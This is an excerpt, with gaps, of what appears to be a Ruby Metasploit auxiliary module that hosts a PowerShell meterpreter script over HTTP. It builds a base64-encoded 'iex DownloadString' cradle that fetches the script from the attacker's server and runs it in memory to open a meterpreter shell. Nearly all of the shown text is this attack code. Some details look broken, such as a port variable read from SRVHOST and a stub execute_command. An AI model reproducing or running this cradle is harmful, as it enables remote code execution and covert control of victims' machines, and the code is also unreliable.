...
class Metasploit3 < Msf::Auxiliary
	...
	def initialize(info={})
		super(update_info(info,
			...
			'Description'    => %q{
			This module stands up an HTTP Server which will host our powershell
			meterpreter script that we will use to execute our meterpreter shell
			in memory
	},
			'Author'      => ['Royce and Chris'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Capture' ]
	...
	def run
		...
		@web_server_port   = datastore['SRVHOST']
	...
	def on_request_uri(cli, request)
		script = get_script
		send_response(cli, script, { 'Content-Type' => 'text/html' })
		broken = Base64.encode64('iex (New-Object Net.WebClient).DownloadString("http://' + Rex::Socket.source_address('1.2.3.4') + ':' + datastore['SRVPORT'].to_s + request.uri + '")').chomp.split
		clean = broken[0] + broken[1]
		puts clean
		execute_command(clean)
	end

	def execute_command(stub)
		command = "%COMSPEC /C powershell"
	end
